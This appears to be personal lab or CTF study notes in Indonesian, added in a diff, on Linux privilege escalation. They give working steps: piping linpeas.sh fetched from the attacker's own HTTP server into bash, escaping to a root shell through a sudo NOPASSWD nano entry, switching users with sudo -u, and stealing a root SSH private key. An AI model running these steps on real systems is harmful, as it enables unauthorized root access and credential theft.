@@ -1,0 +1,32 @@
+privesc
+
+1. buat http server ke direktori payload
+python -m http.server 1111 (1111 itu portnya)
+
+2. curl ke linpeas.sh yang ada di host server terus dijalanin
+curl -L http://<ip>:1111/linpeas.sh | bash
+
+3. kalo nemu ini di sudo -l kerentanannya ada disini
+User john may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/nano <- (vuln disini)
+    (ALL : ALL) ALL
+
+yang dimana kita bisa melakukan command execute buat reset bash nya. tinggal sudo nano /usr/bin/nano privesc
+lalu  ctrl t buat exec command abistu tinggal masukin command:
+reset; /bin/bash 1>&0 2>&0
+dan kita udah otomatis jadi root disini.
+
+LANGKAH PERTAMA SELALU sudo -l
+
+buat privesc ada banyak cara
+1. sudo su - (yang ini terlalu gampang)
+2. sudo -l (ini buat ngecek user low priv bisa exec command apa aja)
+3. sudo -u <target user> <allowed command>
+
+contoh:
+
+sudo -l
+User user1 may run the following commands on ng-2110552-gettingstartedprivesc-mgofl-7d8ffcb5fd-vh9qw:
+    (user2 : user2) NOPASSWD: /bin/bash
+    
+nah ini tinggal sudo -u user2 /bin/bash buat pindah ke user2. terus gimana caranya buat jadi root? karna user2 punya akses buat read data di /root kita tinggal curi aja private key yang ke ekspos di /root/.ssh/id_rsa abistu copy ke machine kita sendiri and janlup di chmod 600 lalu tinggal ssh root@host -p port -i id_rsa dan kita udah jadi root
